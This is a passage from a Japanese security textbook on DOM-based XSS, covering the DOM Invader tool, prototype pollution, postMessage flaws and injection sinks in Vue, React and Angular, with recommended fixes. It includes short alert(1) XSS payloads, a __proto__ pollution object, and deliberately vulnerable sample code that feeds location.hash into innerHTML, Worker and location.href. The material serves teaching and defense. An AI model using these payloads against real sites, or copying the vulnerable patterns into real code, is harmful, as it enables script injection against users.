- **Inject forms**: ページ内のHTMLフォームフィールドに自動的にcanaryを注入して送信する。

#### sinkの自動検出とコンテキスト表示

canaryが注入されたページがロードされると、DOM Invaderは**DOMを解析し、canary文字列がどのsink（危険なAPI呼び出し）に流れ込んでいるかを自動的に特定**します。検出結果は関連度順にソートされて一覧表示されます。

各検出結果に対して、DOM Invaderは次のようなコンテキスト情報を提示します。

- そのsinkがHTMLコンテキストなのかJavaScriptコンテキストなのか（例えば`innerHTML`に代入されるのか、`eval()`に渡されるのか、で必要なペイロードの形が変わる）。
- 注入した文字列の前後にどのような特殊文字が存在するか（属性値の中なのか、タグの外なのか、JS文字列リテラルの中なのかを見分けるために重要）。
- sinkの種類に応じて「Outer HTML」（周辺のHTML構造）、「Frame path」（iframeのネストがある場合の経路）、「Event」（イベントハンドラ経由の場合、どのイベントが引き金か）といった付加情報。

さらに「**Check the Stack Trace in DevTools Console**」の機能により、canaryがsinkに到達する直前のJavaScript呼び出しスタックをそのままDevToolsコンソールに表示させ、**該当するソースコードの行に直接ジャンプ**できます。これにより、脆弱性が「本当にサニタイズされずにsinkへ届いているか」をコード上で確認し、実際に有効なXSSペイロードを組み立てる段階に進めます。

> 出典: PortSwigger公式ドキュメント（DOM XSS） — https://portswigger.net/burp/documentation/desktop/tools/dom-invader/dom-xss
> 出典: DOM Invader: Burp Suite tool to find DOM based XSS easily — Medium (hacksheets) — https://hacksheets.medium.com/dom-invader-burp-suite-tool-to-find-dom-based-xss-easily-3cb09adf4d44

#### Medium記事が示す一連の操作フロー

Medium記事（hacksheets）は、初学者向けに以下の6ステップの実践フローとしてまとめています（ラボの解答そのものではなく、汎用的な手順として引用します）。

1. Burpの「Proxy」タブから組み込みブラウザを開き、拡張機能設定からDOM Invaderを有効化する。
2. 必要であればcanary文字列を分かりやすい値（記事の例では`hacksheetsdomxss`のような識別しやすい文字列）に変更し、リロードする。
3. DevToolsを開き（`Ctrl+Shift+I`）、「DOM Invader」タブ（記事内ではAugmented DOM Tabと呼ばれるDOMビュー）を表示する。
4. 対象ページを開き、疑わしいクエリパラメータにcanaryを注入する。
5. DOM Invaderのパネルで、注入したcanaryが何らかのsinkに反映されているかを確認する。
6. sinkに到達していることが確認できたら、DevToolsコンソール側でスタックトレースを辿り、実行箇所を特定したうえで、実際に動作するXSSペイロードへ組み替えて検証する。

このフローの意義は、「どこに脆弱性があるか」を機械的に絞り込んだうえで、「実際に悪用可能か」の判断と最終的なペイロード作成は引き続き人間が行う、という役割分担にあります。DOM Invaderは発見（discovery）を効率化するツールであり、悪用可能性の最終判定やCSPバイパスの組み立てそのものは代行しません。

> 出典: DOM Invader: Burp Suite tool to find DOM based XSS easily — Medium (hacksheets) — https://hacksheets.medium.com/dom-invader-burp-suite-tool-to-find-dom-based-xss-easily-3cb09adf4d44

### クライアントサイドprototype pollutionの自動検出

DOM InvaderはXSS検出だけでなく、**クライアントサイドprototype pollution**（JavaScriptの`Object.prototype`に任意のプロパティを追加できてしまう脆弱性クラス）の発見も自動化します。これは第4章で扱うmXSS/プロトタイプ汚染の話題とも接続する重要な機能です。

#### ソース検出

有効化するには、DOM Invader設定の「Attack types」セクション内で「**Prototype pollution**」のトグルをオンにし、リロードする必要があります（これもデフォルトでは無効。理由はDOM XSS検出と同様、対象サイトの通常動作に干渉しないようにするためです）。

有効化後、DOM Invaderはページを自動的にスキャンし、「`Object.prototype`に任意のプロパティを追加できる可能性のある経路（ソース）」を探索します。公式ドキュメントが例示する典型例は、URLの`location.hash`（フラグメント識別子）を経由するもので、`__proto__.xxx=yyy`のようなキーをフラグメントに含めたときに、ページ内のマージ処理コード（例えばjQueryの拡張関数や独自実装のdeep-mergeユーティリティ）が`__proto__`という特別なキー名をチェックせずにオブジェクトへ代入してしまうケースです。この種のコードは次のような形になっていることが多いです。

```javascript
// 危険なマージ処理の典型例（概念コード）
function merge(target, source) {
  for (const key in source) {
    if (typeof source[key] === 'object') {
      target[key] = target[key] || {};
      merge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}
```

このコードに`source`として`{"__proto__": {"polluted": "yes"}}`のようなオブジェクトを渡すと、`target.__proto__`（すなわち`Object.prototype`そのもの）に`polluted`プロパティが追加され、以降**そのページ内で生成される全てのオブジェクトが`polluted`プロパティを継承してしまいます**。これがプロトタイプ汚染の基本原理です。DOM Invaderはこのような危険なマージ処理をブラウザ実行時に検知します。

#### 検証（Test）とgadget探索

ソースが検出されると、DOM Invaderは「**Test**」ボタンを提示します。これをクリックすると新しいタブが開き、DOM Invaderが実際に検証用のプロパティ（proof-of-concept property）を`Object.prototype`に追加しようと試みます。ブラウザのコンソールを開いて`Object.prototype`を調べたり、新しいオブジェクトリテラル`{}`を作成してそのプロパティが継承されているかを確認したりすることで、汚染が実際に成立するかを人間の目で確かめられます。

汚染そのものが成立しても、それだけでは「見た目が変わる」以上の実害はまだありません。実際にXSSなどへ昇華させるには、汚染したプロパティを**サニタイズせずに危険なsinkへ渡してしまうコード（gadget）**が別途ページ内に存在する必要があります。DOM Invaderの用語で言う「gadget」とは、公式ドキュメントの定義を借りれば「any user-controllable property that is passed to a sink without being properly sanitized」（サニタイズされずにsinkへ渡される、ユーザーが制御可能なプロパティ）です。

DOM Invaderは「**Scan for gadgets**」ボタンにより、この汚染可能なプロパティ経由でsinkに到達しうるgadgetを自動的に探索し、見つかったsinkをDevToolsパネルに一覧表示します。さらに、ソース・gadget・sinkの3点が揃うと、DOM Invaderは「**それらを組み合わせたPoC（概念実証コード）を自動生成**」する機能まで備えています。これにより、手作業でsourceからsinkまでの実行チェーンを1つずつ追跡する必要がなくなり、「汚染可能な入り口はあるが、実際に悪用可能なgadgetが存在するか」という、従来は非常に時間のかかっていた確認作業が大幅に効率化されます。

HackTricksでは2023年6月版（v2023.6）のBurp Suiteで、専用の「Prototype-pollution」タブが追加され、`__proto__`や`constructor.prototype`といった典型的なプロトタイプ汚染用キー名をパラメータ名に対して自動的に変異（mutate）させ、sink地点での汚染発生を検出する機能が実装されたと説明されています。これはDOM Invaderが単なる「文字列追跡ツール」ではなく、JavaScriptのオブジェクトモデル（プロトタイプチェーン）の挙動そのものを実行時に監視する設計になっていることを示しています。

> 出典: PortSwigger公式ドキュメント（Prototype pollution） — https://portswigger.net/burp/documentation/desktop/tools/dom-invader/prototype-pollution
> 出典: DOM Invader — HackTricks — https://hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/dom-invader.html

### web message（postMessage）の解析機能

第3章の他節で扱う`postMessage`ベースのDOM XSSについて、DOM Invaderは専用の解析パネルを持ちます。設定の「Attack types」内の「**Postmessage interception**」をオンにしてリロードすると、以下の機能が有効になります。

- **ロギング**: ページ上で`postMessage()`メソッドにより送信された全てのweb messageを記録する。
- **手動編集・再送信**: Burp Repeaterのように、記録したメッセージの内容を書き換えて再送信できる。具体的には「Messages」ビューで対象メッセージを選択し、「Data」フィールドの中身を書き換えたうえで「Send」をクリックする。
- **自動解析**: DOM Invaderは2つの方法で自動的にメッセージを改変し、脆弱性の兆候を探る。
  1. **canaryをメッセージの`data`プロパティに注入**し、脆弱なsinkに到達するかを調べる。
  2. **メッセージの送信元origin情報を偽のoriginに置き換え**、受信側の`postMessage`イベントリスナーが`event.origin`の検証をきちんと行っているか（バリデーションの不備）を検出する。

脆弱性が確認できた場合は、「**Build PoC**」をクリックすることで、悪用可能なHTMLコードが自動生成されクリップボードにコピーされます。これは、攻撃者が用意した悪意あるページから被害者のタブへ偽装メッセージを送りつける、という典型的なpostMessage攻撃の雛形を素早く作るための機能です。

> 出典: PortSwigger公式ドキュメント（Web messages） — https://portswigger.net/burp/documentation/desktop/tools/dom-invader/web-messages

### DOM clobberingの自動検出

DOM Invaderはさらに、DOM clobbering（HTMLタグのid属性やname属性を利用して、ページ内のJavaScript変数を意図せず上書き・偽装する手法。第4章で詳述）の自動検出にも対応しています。公式ドキュメントの定義は簡潔に「DOM clobbering is a technique in which you inject HTML into a page to manipulate the DOM」（ページにHTMLを注入することでDOMを操作する手法）としています。

有効化するには、設定の「Attack types」内で「**DOM clobbering**」のトグルをオンにし、ブラウザをリロードします。有効化後は、通常のブラウジング中に自動的にDOM clobberingの脆弱性パターンをスキャンします。これも他の攻撃タイプ同様デフォルトでは無効であり、対象サイトの挙動を不用意に変えないための配慮です。

> 出典: PortSwigger公式ドキュメント（DOM Clobbering） — https://portswigger.net/burp/documentation/desktop/tools/dom-invader/dom-clobbering

### 設定項目の全体像

PortSwigger公式ドキュメントによれば、DOM Invaderの設定パネル（ブラウザ右上のBurp Suiteロゴをクリックして開く「DOM Invader」タブ）は次の6カテゴリに整理されています。

1. **Main settings** — DOM Invader全体のオン/オフなど基本設定。
2. **Attack types** — DOM XSS、Prototype pollution、DOM clobbering、Postmessage interceptionなど、どの検出機能を有効にするかを個別に切り替える。
3. **Web message settings** — postMessage解析に関する詳細オプション。
4. **Prototype pollution settings** — プロトタイプ汚染検出に関する詳細オプション（対象プロパティ名の絞り込みなど）。
5. **Misc settings** — その他雑多な設定。
6. **Canary settings** — canary文字列のカスタマイズや、注入対象とするソース・パラメータのアローリスト（許可リスト）設定。

HackTricksの解説では、canary設定において「全ソースへの自動注入」を有効にできる一方で、**注入対象のソースやパラメータ名をアローリストで絞り込む設定も可能**であると触れられています。大規模なSPA（Single Page Application）など、あらゆるパラメータに自動注入すると誤検知やノイズが増えすぎる場合、対象を絞ることで実務上のシグナル/ノイズ比を改善できます。

> 出典: PortSwigger公式ドキュメント（DOM Invader Settings） — https://portswigger.net/burp/documentation/desktop/tools/dom-invader/settings
> 出典: DOM Invader — HackTricks — https://hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/dom-invader.html

### Burp Repeater/Proxyとの連携という実務上の勘所

HackTricksが指摘している実務上重要なポイントとして、DOM Invaderは単体で完結するツールではなく、**Burp RepeaterやProxyと組み合わせて使う**ことで真価を発揮します。DOM Invaderのブラウザ内での検出は「ブラウザの実行時状態」に基づくものであり、それを引き起こした「HTTPリクエスト/レスポンスの組」を再現できなければ、報告書やチーム内共有のための再現手順が書けません。そのため実際のワークフローでは、

1. Burpの組み込みブラウザ上でDOM Invaderにより脆弱なsinkを特定する。
2. Burp Proxyの履歴から、そのページ・パラメータに対応するHTTPリクエストを特定する。
3. Burp Repeaterでそのリクエストを再現し、微修正しながら最終的なペイロードを固める。

という一連の流れが推奨されます。DOM Invaderは「どこに脆弱性がありそうか」を高速に絞り込む探索ツールであり、最終的な悪用可能性の確認と報告用の再現手順の確立は、従来通りBurpの他の機能と組み合わせて行う、という位置づけを正しく理解しておくことが重要です。

> 出典: DOM Invader — HackTricks — https://hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/dom-invader.html

### まとめ

DOM Invaderは、DOMベースXSS・クライアントサイドprototype pollution・DOM clobbering・postMessage関連の脆弱性という、いずれも「ブラウザの実行時にしか観測できない」タイプの脆弱性クラスに対して、canaryという追跡可能な文字列を軸に、ソースからsinkまでの実行経路を自動計測・可視化するツールです。有効化はデフォルトでオフになっており、Attack typesごとに個別にオン/オフを切り替え、そのたびにブラウザのリロードが必要という運用上の癖があります。canaryは他の文字列と衝突しないユニークな値を選ぶことが誤検知を避けるうえで重要であり、prototype pollutionについては「汚染可能なソースの発見」と「実害につながるgadgetの発見」が別工程として提供されている点、postMessageについては「ロギング・改変再送・自動解析・PoC生成」までが一気通貫でサポートされている点が実務上の強みです。最終的な悪用可能性の判断とレポーティングのための再現手順は、引き続きBurp Repeater/Proxyとの連携によって固めることになります。

---

## 日本語DOM XSS資料（はせがわ / Flatt SPA）

前節までの PortSwigger 資料は source/sink の体系と DOM Invader の使い方という「発見の技法」に重点がありました。本節では視点を変え、**「なぜ現代のフロントエンド技術（HTML5世代のブラウザAPI、そしてSPA=Single Page Applicationを支えるJavaScriptフレームワーク）がDOMベースXSSの温床になりやすいのか」**を、日本語で書かれた2つの一次資料——はせがわ氏の講演資料『JavaScript Security beyond HTML5』と、GMO Flatt Security 社のブログ記事『SPAにおけるインジェクション』——から掘り下げます。前者は2013年、HTML5が普及し始めた時期にブラウザAPI単位でリスクを洗い出したもの、後者はVue/React/Angularという2020年代の三大フレームワークを横並びで検証したものであり、**「素のJavaScript時代のDOM XSS」から「フレームワーク時代のDOM XSS」への論点の推移**を追体験できる組み合わせになっています。

---

### 1. はせがわ『JavaScript Security beyond HTML5』(2013)

#### 1.1 位置づけと射程

このスライドはタイトルの通り「HTML5を"超えて"」——つまり従来型のHTMLタグ・属性インジェクションではなく、HTML5世代で追加・強化されたブラウザAPI（Web Storage、Web Workers、Cross-Document Messaging＝`postMessage`など）が生む**新しい攻撃面**を体系立てて紹介する講演です。刊行から10年以上が経過していますが、扱っているAPI自体（`innerHTML`、`postMessage`、Web Storage、Web Workers）は現在も現役であり、ここで示された原理は今日のSPAにもそのまま適用できます。

> ⚠️ 本資料はスライド形式のため、口頭説明部分は復元できていません。以下はスライド本文から読み取れる範囲の技術内容です。

#### 1.2 DOMベースXSSの定義と最小例

資料はDOMベースXSSを「**JavaScriptが引き起こすXSS。サーバ側のHTML生成時には問題なく、JavaScriptによるHTMLレンダリング時に発生**」と定義しています。これは前節のPortSwigger資料の定義と本質的に同じですが、「サーバ側の出力は無害なのに、クライアント側の処理段階で有害化する」という**責任の所在の移動**を端的に言い切っている点に価値があります。具体例として次のパターンが挙げられています。

```javascript
div.innerHTML = location.hash.substring(1);
// アクセスURL: http://example.jp/#<script>alert(1)</script>
```

**なぜ動くか**: `location.hash` は URL の `#` 以降（フラグメント）をそのまま返す source です。`.substring(1)` は先頭の `#` 文字を除去するためだけの処理で、値の危険性には一切関与しません。この文字列が `innerHTML`（要素の中身をHTMLとして再パースさせる sink）に直接代入されると、ブラウザは代入された文字列を**新規のHTMLとして構文解析**し直します。このとき `<script>` 要素が含まれていれば、HTMLパーサはそれを「実行すべきスクリプトタグ」として認識し、`alert(1)` が実行されます（厳密には `innerHTML` 経由で挿入された `<script>` タグは仕様上"非実行"扱いされるブラウザもありますが、`<img src=x onerror=...>` のようなイベントハンドラ埋め込み型のペイロードであれば`innerHTML`経由でも確実に実行されるため、実務上の脅威は変わりません）。前述の通り `#` 以降はサーバに送信されないため、**このURLをサーバのアクセスログで検知することはできません**。

対策として資料が挙げるのは、HTMLエンティティへの手動エスケープと、テキストノードとして挿入する方法の2通りです。

```javascript
// (a) エスケープしてからHTMLとして挿入
div.innerHTML = s.replace(/&/g, "&amp;")
                 .replace(/</g, "&lt;")
                 .replace(/>/g, "&gt;");

// (b) そもそもHTMLとして解釈させない
div.appendChild(document.createTextNode(s));
```

**なぜ安全になるか**: (a) は `<` `>` `&` という「HTMLパーサに構造として解釈される特殊文字」を、パーサが構造として認識しない実体参照（`&lt;` など）に置き換えることで、**入力を常にテキストとしてのみ解釈させる**手法です。(b) はさらに直接的で、`createTextNode()` が作るのはHTMLとしてパースされないプレーンテキストノードであり、`appendChild()` はDOMツリーへのノード追加であって「文字列の再パース」を一切経由しません。**HTML文字列としての再解釈が起きない限りXSSは成立しない**という、DOMベースXSS対策の最も基本的な原則がここに表れています。

#### 1.3 HTML5の新要素とブラックリスト検出のすり抜け

資料はさらに、HTML5で新設・拡張されたタグや属性が**既存のフィルタのブラックリスト（禁止パターンの列挙によるフィルタリング）をすり抜ける**問題を指摘しています。例として挙げられているのが次のパターンです。

```html
<form><button formaction="javascript:alert(1)">click</button></form>
```

**なぜ動くか**: `formaction` はHTML5で新設された属性で、`<button>` や `<input type="submit">` がフォーム送信時にどのURLへ遷移するかを個別に上書きできます。この属性値に `javascript:` スキームのURLを指定すると、ボタンがクリックされた瞬間にそのJavaScriptコードが実行されます。フィルタが `onclick=` や `<script>` のような"古典的な"危険パターンだけをブロックしていた場合、`formaction` のような**新しい属性名を知らない**ため素通りしてしまいます。これはHTML5に限らず、ブラウザ仕様が拡張され続ける限り繰り返される構造的な問題であり、資料はこれに対する根本対策として「**個々の危険パターンを禁止するのではなく、HTML生成時に必ずエスケープする**」という原則、すなわちブラックリスト方式ではなくエスケープ（またはアプローチとして許可リスト＝ホワイトリスト方式のサニタイズ）を徹底することを説いています。ブラックリストは「知らない攻撃パターン」に対して原理的に無力ですが、正しいエスケープは入力の中身を一切問わず安全側に倒せるためです。

#### 1.4 オープンリダイレクタ

```javascript
var url = decodeURIComponent(location.hash.substring(1));
location.href = url;
```

**なぜ危険か**: これは厳密にはスクリプト実行を伴わないバグですが、DOMベースXSSと発生源が同じ（URL由来のsourceをそのまま危険なsinkへ渡す）ため併記されています。`location.hash` から取り出した値をデコードし、そのまま `location.href`（ページ遷移を起こすsink）に代入すると、攻撃者は正規ドメインのURL（信頼されたドメイン）を経由してフィッシングサイトなど任意の外部URLへ被害者を転送できます。これは「一見信頼できるドメインのリンクなのに、実際には別サイトに飛ばされる」というオープンリダイレクタ脆弱性そのものです。フィッシング詐欺の踏み台や、OAuthのリダイレクトURI検証回避など、より深刻な攻撃の一部品として悪用されることが多い点が実務上重要です。

対策として挙げられているのは、**遷移先を許可リスト（ホワイトリスト）で管理する**方法です。

```javascript
var pages = {foo: '/foo', bar: '/bar'};
var url = pages[location.hash.substring(1)] || '/';
location.href = url;
```

**なぜ安全か**: 攻撃者が制御できる `location.hash` の値は、もはや「遷移先URLそのもの」ではなく「事前定義済みマップのキー」としてしか使われません。マップに存在しないキーが来た場合は既定値 `/` にフォールバックするため、**攻撃者がどんな文字列を仕込んでも、開発者が用意した固定URL集合の外には絶対に出られません**。これは入力値そのものを検証・無害化するのではなく、「入力値を直接使わず、間接参照のキーとしてのみ使う」という設計転換によって脆弱性のクラス自体を排除する典型的なパターンです。

#### 1.5 Web Storage（`localStorage` / `sessionStorage`）

資料はHTML5で導入されたWeb Storageについて、**「ユーザ認証状態の時間差による混在」**というリスクを指摘しています。具体的には、共有端末でユーザAがログインしてストレージに何かを書き込み、ログアウトした後、同じオリジン（同一のプロトコル・ホスト・ポートの組み合わせ。ブラウザのセキュリティ境界の基本単位）で別のユーザBがログインした場合、**Web StorageはオリジンごとにOSプロセス／ブラウザプロファイル上に永続化されるため、ユーザAが書き込んだデータをユーザBが読めてしまう**可能性があるというものです。これはXSSそのものではなく情報漏えいの一種ですが、「クライアント側に永続化されたデータの取り扱い」という同じ論点系列に属します。対策として挙げられているのは、**キー名にユーザIDを含めて名前空間を分離する**単純な手法です。

```javascript
sessionStorage.setItem(userid + "-foo", "abcdefg");
```

**なぜ効くか**: ストレージ自体はオリジン単位でしか分離されないため、アプリケーション側の責任で**論理的なユーザ単位の分離**をキー設計に組み込む必要があります。ユーザIDをキーのプレフィックスにすることで、別ユーザのセッションでは意図したキーがヒットしなくなり、誤読み出しを防げます。

#### 1.6 Web Workers

```javascript
new Worker(location.hash.substring(1));
```

**なぜ危険か**: `Worker` コンストラクタは、指定したURLのスクリプトを**別スレッド（バックグラウンド実行環境）として読み込み実行**します。URLの生成元をユーザ制御下の `location.hash` にしてしまうと、攻撃者は任意のスクリプトURLをWorkerとして実行させられます。Workerはメインスレッドとは隔離された実行コンテキストを持ち、DOMへの直接アクセスはできないものの、`postMessage` を介してメインスレッドと通信できるため、最終的にメインスレッド側のDOM操作を誘発する踏み台になり得ます。教訓は単純で、**動的に生成される実行対象（スクリプトURL）にユーザ入力を混ぜてはならない**という、`eval` 系sinkと同型のリスクです。

#### 1.7 Cross-Document Messaging（`postMessage`）

```javascript
window.onmessage = function(e) {
  if (e.origin == "http://example.com") {
    alert(e.data);
  }
};
```

**なぜ `origin` 検証が必須か**: `postMessage` はウィンドウ間・iframe間で任意のオリジンをまたいでメッセージを送受信できるAPIです。受信側の `message` イベントには送信元を示す `event.origin` が付与されますが、**これを検証しないまま `event.data` を信頼してしまうと、任意の悪意あるページから送られたデータをそのまま処理してしまう**ことになります。上記コードはその模範例として `origin` の一致確認を行っていますが、資料はさらに一歩踏み込み、**送信側**が `postMessage()` の第2引数（送信先オリジンの指定）に `*`（任意のオリジンを意味するワイルドカード）を指定した場合、「意図しない別オリジンの受信者にメッセージが渡ってしまう」リスクにも言及しています。第2引数を `*` にすると、ページが（リダイレクトやiframeの差し替えなどで）想定と異なるオリジンに読み込まれていた場合でも、機密情報がそのまま送られてしまうため、**機密情報を送る際は必ず送信先オリジンを明示的に指定すべき**というのが結論です。この `postMessage` の攻撃面は本書第7章（Webメッセージング攻撃）でさらに詳しく扱います。

> 出典: はせがわ「JavaScript Security beyond HTML5」— https://www.docswell.com/s/hasegawa/ZDWWWK-2022-03-14-212823

---

### 2. Flatt Security『SPAにおけるインジェクション』

#### 2.1 問題設定 — なぜSPAではスキャナが無力化するのか

この記事の核心的な主張は、**「自動脆弱性スキャナはペイロードをHTTPリクエストとして送信し、レスポンスのHTML内にそれが反映されるかを機械的にチェックする」という前提そのものが、SPAでは成立しなくなる**という点です。SPA（Single Page Application）は、初回読み込み後の画面遷移や表示更新をサーバから新しいHTMLを取得することなく、クライアント側のJavaScript（React・Vue・Angularなどのフレームワーク）が**DOM操作だけで完結させる**アーキテクチャです。攻撃ペイロードを含む入力があっても、それが処理されるのは常にブラウザ内のJavaScript実行コンテキストであり、サーバから返るレスポンス自体には仕込んだ文字列がそのまま現れないケースが多いため、**「レスポンスHTMLに反射したかどうか」を見る古典的な検出ロジックはヒットしません**。記事では実際に、Active Scan（HTTPリクエスト/レスポンスの内容を機械的に走査する自動診断機能）を用いた検証で、明らかに存在するDOMベースXSSが検出されなかった事例が示されています。これはPortSwigger資料が示す「DOMベースXSSはサーバを介さないため防御側の可視性が下がる」という論点の、**診断ツールというレイヤーにおける具体化**と言えます。

#### 2.2 Vue.js — `v-html` ディレクティブ

Vueには、コンポーネントの状態（データ）をHTMLとしてそのまま描画するための `v-html` ディレクティブがあります。

```html
<div v-html="userInput"></div>
```

**なぜ危険か**: `v-html` はVueの通常のテンプレート補間（`{{ }}`、これは自動的にHTMLエスケープされテキストとしてのみ描画される）とは異なり、**バインドした値をHTML文字列として解釈し、そのままDOMに挿入する**指示です。内部的には対象要素の `innerHTML` へ代入する処理に相当するため、前節で見た「HTML文字列としての再パース」が起こり、DOMベースXSSの典型的なsinkになります。Vue自身は `<script>` タグそのものは実行されないようブロックしますが、**イベントハンドラ属性を使ったペイロードはブロックされません**。

```html
<img src=x onerror='alert(1)'>
```

**なぜ動くか**: `<img>` タグの `src` 属性に無効な値（`x`）を指定すると画像の読み込みに失敗し、`onerror` イベントハンドラが発火します。`<script>` タグと違い `<img>` タグは通常のHTML要素としてパーサに受理されるため、`innerHTML`（および`v-html`）経由の挿入であってもブラウザによる"非実行"扱いの対象外であり、確実にJavaScriptとして実行されます。つまり `v-html` の「スクリプトタグだけをブロックする」という不完全な安全策は、**イベントハンドラ属性というまったく別の実行経路**によって容易に迂回されます。

さらに記事は、URLを直接埋め込むバインディング（`v-bind:href` など、属性値をJavaScriptの式で動的に決定する構文）についても、値の検証を行わずにユーザ入力をそのままリンク先に使うと `javascript:` スキームのURLを注入できる点を指摘しています。

```html
<a v-bind:href="userInput">click</a>
<!-- userInput = "javascript:alert(1)" -->
```

**なぜ動くか**: `href` 属性は本来 `http:`/`https:` のようなナビゲーション用のスキームを想定していますが、ブラウザは `javascript:` スキームも仕様上受理し、そのリンクがクリックされた瞬間に指定されたコードを実行します。これはDOMツリーの構造自体は書き換えられていない（sinkとしての `innerHTML` は経由しない）ため`v-html`のケースとは異なる系統の脆弱性ですが、「**URL文字列を受け取る箇所にはすべてスキーム検証が必要**」という、`location.href` への代入（前節1.4）と同型の教訓に帰着します。

**対策**として記事が挙げるのは、プレーンテキストとして表示するだけなら `v-html` の代わりに通常のテキスト補間（`v-text` やMustache構文）を使うこと、どうしてもHTMLとして描画する必要がある場合は `sanitize-html` のようなサニタイズライブラリ（HTML文字列から危険なタグ・属性だけを除去するライブラリ）で無害化してから渡すこと、そしてURLバインディングには `sanitize-url` のようなライブラリで `javascript:` 等の危険なスキームを弾いてから使うことです。

#### 2.3 React — `dangerouslySetInnerHTML`

Reactにおける等価物が `dangerouslySetInnerHTML` です。

```jsx
<div dangerouslySetInnerHTML={{ __html: userInput }} />
```

**なぜ危険か**: このプロパティ名自体がReactチームによる「危険であることを自覚させるための意図的な命名」であり、内部的には対象要素の `innerHTML` に直接値を設定します。Vueの `v-html` とまったく同じ理由（HTML文字列としての再パース）でDOMベースXSSのsinkとなり、`<script>` タグは実行されない一方で `<img src=x onerror='alert(1)'>` のようなイベントハンドラ埋め込み型ペイロードは確実に実行される、という挙動もVueと共通しています。React自身の通常のJSX式展開（`{userInput}` のような中括弧構文）はデフォルトでエスケープされテキストとして描画されるため安全ですが、`dangerouslySetInnerHTML` を使った瞬間にその保護の外に出てしまう点が要注意です。

URLバインディング（`<a href={link}>` のような属性への直接代入）についても、Vueと同様に `javascript:` スキームの注入を許してしまう点が指摘されています。

**対策**として記事は、`dangerouslySetInnerHTML` の使用自体を可能な限り避けること、使う場合は `sanitize-html` 等でサニタイズしてから渡すこと、`href` などURLを受け取る属性には `@braintree/sanitize-url` のようなライブラリで危険なスキームを除去してから渡すことを推奨しています。

#### 2.4 Angular — フレームワーク側の自動サニタイズ

対照的に記事は、Angularは**デフォルトで `innerHTML` 相当のバインディングや `href` バインディングに対して自動的にサニタイズ処理を適用する**ため、Vue/Reactで示したのと同じ攻撃パターンを試しても防御される、と評価しています。これはAngularの `DomSanitizer`（信頼できないコンテンツを安全な形に変換する仕組みを提供するAngularのサービス）が、テンプレートバインディングの既定の挙動として「危険なコンテキストに渡る値は自動的に無害化する」という設計を取っているためです。逆に言えば、開発者が明示的に `bypassSecurityTrustHtml()` のようなAPI（Angularに「このコンテンツは安全だと信頼してよい」と申告し、自動サニタイズを迂回させるAPI）を呼び出してこの保護を意図的に外した場合は、Angularであっても当然同種のDOMベースXSSが成立します。つまりAngularの安全性は「フレームワークが安全策を自動適用する設計になっている」ことに由来するものであり、**開発者がその保護を明示的に無効化する操作をしない限りは安全**という条件付きの安全性である点を理解しておく必要があります。

#### 2.5 実務上の含意 — フレームワークの「安全なデフォルト」に対する過信の危険性

この記事全体を通した含意は、**「モダンフレームワークを使っているから自動的にXSS対策済みである」という思い込みが最も危険**だということです。Vue/Reactはテンプレート補間やJSX式展開といった"通常の書き方"をしている限り自動エスケープの恩恵を受けられますが、`v-html` や `dangerouslySetInnerHTML` のような**「生のHTMLを扱いたい」という開発者の明示的な意図を表すAPI**を一度でも使うと、その瞬間にフレームワークの保護レイヤーの外に出ます。これは本節1.3ではせがわ資料が指摘した「ブラックリストは知らないパターンに無力」という論点の発展形であり、**「デフォルトが安全でも、危険なAPIへ抜け道があれば脆弱性は必ず出現する」**という、フレームワーク非依存の普遍的な教訓です。ペネトレーションテストやコードレビューの実務では、`grep` 等で `v-html` / `dangerouslySetInnerHTML` / `bypassSecurityTrust*` / `innerHTML` といったキーワードをソースコード全体から機械的に洗い出し、それぞれのデータフロー（どのsourceの値がそこに流れ込むか）を個別に追跡することが、自動スキャナに頼れないSPAにおける現実的な監査手法になります。

> 出典: 「SPAにおけるインジェクション」 GMO Flatt Security Blog — https://blog.flatt.tech/entry/spa_injection

---

### 3. まとめ — 素のDOM XSSからフレームワーク時代のDOM XSSへ

はせがわ資料（2013年）が示した原則は、**「HTML文字列としての再解釈が起きる代入先（sink）に、検証していない外部データを渡してはならない」**という一言に集約されます。この原則は `innerHTML` への直接代入であろうと、10年後のVue/Reactの `v-html` / `dangerouslySetInnerHTML` であろうと、**内部実装が結局は同じ `innerHTML` 相当の操作に帰着する以上、まったく同じ形で当てはまり続けます**。フレームワークが変わっても、URLスキームの検証漏れ（`javascript:` インジェクション）、ブラックリスト検出の限界、そして「サーバを介さないためログにもスキャナにも引っかからない」というDOMベースXSS特有の可視性の低さは一貫して再生産されています。次節以降では、この「sinkの危険性」をさらに掘り下げ、`postMessage` を悪用したクロスオリジンの攻撃（第7章）や、フレームワークのサニタイズをすり抜けるより高度な手法へと話を進めます。

---

## postMessage経由のDOM XSS

反射型XSS（サーバがユーザー入力をそのままHTMLに埋め込んで返してしまうタイプ）を卒業した学習者が次に必ずぶつかるのが、**クライアント側だけで完結するXSS**、すなわちDOMベースXSSです。その中でも `postMessage` を悪用するものは、次の三つの理由から現代のバグバウンティで極めて重要度が高い領域になっています。

1. **サーバのレスポンスを一切書き換えなくても成立する。** ペイロードは `event.data`（後述）というJavaScriptのオブジェクトとしてブラウザ内部を流れるため、WAF（Web Application Firewall。HTTPリクエスト/レスポンスを検査してXSS等をブロックする防御機構）やサーバ側フィルタの多くを素通りします。
2. **窓（ウィンドウ）やiframeをまたぐ「信頼境界」の設計ミスを突く。** 攻撃対象のサイトそのものではなく、そこに埋め込まれた広告・SNSシェアボタン・チャットウィジェット・OAuthポップアップなどの `postMessage` 実装が穴になることが多く、**第三者スクリプト（サードパーティスクリプト）経由で数百万サイトが一括で脆弱になる**という破壊力を持ちます（本節の実例で扱う AddThis はまさにこれです）。
3. **一見「ちゃんとチェックしている」コードでもバイパスできる。** `indexOf` や正規表現による中途半端なオリジン検証は、ブラウザやJavaScriptの言語仕様の挙動を突いて破れます。ここに、この教科書が最も価値を置く「なぜそうなるのか」の原理が詰まっています。

このセクションでは、まず `postMessage` API そのものの仕組みを土台から説明し、脆弱性の本質（どこで信頼境界が破れるのか）を明らかにします。次に AddThis の実例で「本物の被害」を体感し、その後にオリジン検証バイパスの各テクニックを**仕組みのレベルで**分解します。最後にプロトタイプ汚染やCSPと組み合わせた高度な連鎖、発見のワークフロー、そして正しい防御策までを一気通貫で扱います。

本節の主資料は以下の3件で、いずれも直接取得（WebFetch）に成功しています。
- postMessage脆弱性入門（YesWeHack）: https://www.yeswehack.com/learn-bug-bounty/introduction-postmessage-vulnerabilities
